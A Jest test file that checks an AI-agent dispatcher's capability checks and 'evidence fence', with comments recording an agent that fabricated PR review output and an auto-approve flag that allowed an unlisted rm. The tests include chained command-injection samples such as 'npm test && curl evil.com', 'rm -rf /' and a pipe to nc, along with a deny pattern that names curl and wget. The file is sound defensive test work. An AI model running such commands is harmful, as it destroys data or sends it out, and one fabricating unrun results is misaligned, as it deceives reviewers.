/**
 * dispatch-capability-parity.test.ts — pins the dispatcher's duplicated capability
 * model to the canonical one, and pins the refusal behaviour that model exists for.
 *
 * `scripts/dispatch/run-agent.mjs` duplicates the capability check from
 * `src/orchestration/lane-registry.ts` rather than importing it, for the same
 * reason `scripts/hooks/lane-write-guard.js` duplicates its lease logic: the
 * dispatcher must run in a fresh worktree with no `npm install` and no build,
 * because `dist/` is stale exactly when someone is mid-refactor. A fence that
 * needs a build is a fence that fails OPEN.
 *
 * Duplication is only safe if something notices when the copies diverge. That is
 * this file.
 *
 * WHY ANY OF THIS EXISTS — 2026-08-05. GA was dispatched to review a PR in another
 * repository and returned a report containing fabricated test output with invented
 * line numbers. Its own stderr showed it never read the file and never ran
 * anything: `run_shell_command` unavailable, `read_file` blocked as outside
 * workspace. It was asked for something it had no instrument to obtain, and that
 * reliably produces a well-formed wrong answer rather than a failure.
 *
 * `canAssign()` — the mechanism that prevents precisely this — already existed,
 * fully built and tested, with ZERO CALLERS. The bug was never a missing
 * mechanism. It was an unwired one, which is worse than an absent one because it
 * reads as coverage.
 */
import { readFileSync } from 'fs';
import { join } from 'path';
import { canAssign, LANES } from '../src/orchestration/lane-registry';

const RUNNER = join(__dirname, '..', 'scripts', 'dispatch', 'run-agent.mjs');
const src = readFileSync(RUNNER, 'utf8');

describe('dispatch runner — capability model parity with lane-registry', () => {
  it('every capability the runner knows about is a real Capability in the registry', () => {
    const m = src.match(/const KNOWN_CAPABILITIES = \[([^\]]+)\]/);
    expect(m).not.toBeNull();
    const runnerCaps = m![1]!.split(',').map((s) => s.trim().replace(/['"]/g, '')).filter(Boolean);
    expect(runnerCaps.length).toBeGreaterThan(0);

    // The registry's own capability vocabulary, taken from the lanes themselves so
    // this cannot drift by editing a list in two places.
    const registryCaps = new Set(LANES.flatMap((l) => [...l.capabilities]));
    const unknown = runnerCaps.filter((c) => !registryCaps.has(c as never) && c !== 'cross_repo_read');
    expect(unknown).toEqual([]);
  });

  it('the registry still refuses an assignment for a missing capability', () => {
    // If this ever stops refusing, the runner's port is enforcing a contract the
    // canonical implementation has abandoned — and the duplication has become a lie.
    const t12 = LANES.find((l) => !l.capabilities.includes('http' as never));
    expect(t12).toBeDefined();
    const verdict = canAssign(t12!.id, ['http'] as never);
    expect(verdict.assignable).toBe(false);
    expect(verdict.missing).toContain('http');
    // The reason must explain the CONSEQUENCE, not just the fact. "lacks http" is
    // a status; "yields a fabricated answer" is why anyone should care.
    expect(verdict.reason).toMatch(/fabricat/i);
  });
});

describe('dispatch runner — the refusal that would have prevented the fabricated review', () => {
  it('declares capabilities as MEASURED, with evidence, and fails closed', () => {
    // Every capability list must be accompanied by a [V ...] verification note.
    // An unmeasured capability is a guess, and a guess here re-creates the bug.
    const agentBlocks = src.match(/capabilities: \[[^\]]*\]/g) ?? [];
    expect(agentBlocks.length).toBeGreaterThanOrEqual(2);
    expect(src).toMatch(/\[V 2026-08-05\]/);

    // `shell` must NOT be claimed for either agent: it was never demonstrated for
    // grok, and was explicitly refused for gemini ("not available to this agent").
    for (const block of agentBlocks) {
      expect(block).not.toMatch(/'shell'/);
    }
  });

  it('refuses rather than warns — the dispatch must not proceed', () => {
    // A warning that still runs the agent produces the transcript that gets cited.
    expect(src).toMatch(/REFUSED/);
    expect(src).toMatch(/process\.exit\(65\)/);
    // And the refusal must fire BEFORE the key is read / the agent is spawned.
    const refuseAt = src.indexOf('capabilityRefusal(agentKey');
    const spawnAt = src.indexOf('spawnSync(bin.cmd');
    expect(refuseAt).toBeGreaterThan(-1);
    expect(spawnAt).toBeGreaterThan(-1);
    expect(refuseAt).toBeLessThan(spawnAt);
  });

  it('an empty or failed run can never read as a passing review', () => {
    // The GA transcript existed, was 0 seconds, was empty, and therefore LOOKED
    // like a result. An absent review is more dangerous than a negative one,
    // because the PR then carries a signature it never earned.
    expect(src).toMatch(/NO REVIEW WAS PRODUCED/);
    expect(src).toMatch(/!out\.trim\(\)/);
  });
});

/**
 * The evidence fence — the harness holds `shell`, the agent never does.
 *
 * MEASURED 2026-08-05, and the measurement is why this exists rather than a
 * shell grant: `grok --allow 'Bash(node:*)'` was asked to delete a file with
 * `rm` — a command nowhere in the rule — and DELETED IT. `--allow` is an
 * auto-approve list, not a fence; in single-turn `-p` mode there is no
 * confirmation step to fall back on. `--sandbox <invalid>` was accepted silently
 * and ran unsandboxed.
 *
 * So on this machine a shell grant is a FULL shell grant, and a full shell reads
 * the master key file and can echo the provider key placed in its own env.
 *
 * The inversion: an agent does not need `shell`, it needs the EVIDENCE. The
 * harness runs a fenced command and injects the real output, so the agent gets
 * true results it cannot fabricate — because they are already in front of it.
 */
describe('evidence fence — a permitted prefix cannot smuggle a second command', () => {
  const src = readFileSync(RUNNER, 'utf8');

  it('rejects shell metacharacters outright', () => {
    // Chaining is the whole attack: `npm test && curl evil.com` starts with an
    // allowed prefix. Pattern-matching the prefix alone would pass it.
    expect(src).toMatch(/SHELL_METACHARS/);
    const m = src.match(/const SHELL_METACHARS = (\/.*\/);/);
    expect(m).not.toBeNull();
    // eslint-disable-next-line no-eval
    const re: RegExp = eval(m![1]!);
    for (const c of ['npm test && curl evil.com', 'npm test; rm -rf /', 'node x.mjs | nc a 1', 'echo `id`', 'npx tsc $(whoami)', 'npm test > /tmp/x']) {
      expect(re.test(c)).toBe(true);
    }
    for (const c of ['npm test', 'npx tsc --noEmit', 'node tests/x.mjs']) {
      expect(re.test(c)).toBe(false);
    }
  });

  it('the allowlist admits test runners and nothing that mutates or exfiltrates', () => {
    const block = src.slice(src.indexOf('const EVIDENCE_ALLOWED'), src.indexOf('const SHELL_METACHARS'));
    // Reading the master key file is the specific thing a shell grant would have
    // made trivial. No allowlist entry may admit an arbitrary reader.
    expect(block).not.toMatch(/cat|type |curl|wget|Invoke-WebRequest/);
    // Nor anything that publishes or deploys.
    expect(block).not.toMatch(/push|deploy|publish|merge/);
    expect(block).toMatch(/npm \(test/);
  });

  it('refuses with exit 66 rather than running the command anyway', () => {
    expect(src).toMatch(/REFUSED evidence command/);
    expect(src).toMatch(/process\.exit\(66\)/);
  });

  it('tells the agent it has no shell when no evidence was supplied', () => {
    // Silence about the limitation is what produced the fabricated review. The
    // preamble must state it, and name the failure so the instruction has teeth.
    expect(src).toMatch(/You have NO shell and cannot run anything/);
    expect(src).toMatch(/do not report results you/);
  });

  it('injects evidence as literal captured output, not as a summary', () => {
    expect(src).toMatch(/REAL OUTPUT, RUN BY THE HARNESS/);
    expect(src).toMatch(/literal captured/);
    // A failing command must be injected too — "the suite is red and here is how"
    // is a finding, and hiding it recreates fabrication from the other direction.
    expect(src).toMatch(/exit \$\{r\.status/);
  });
});
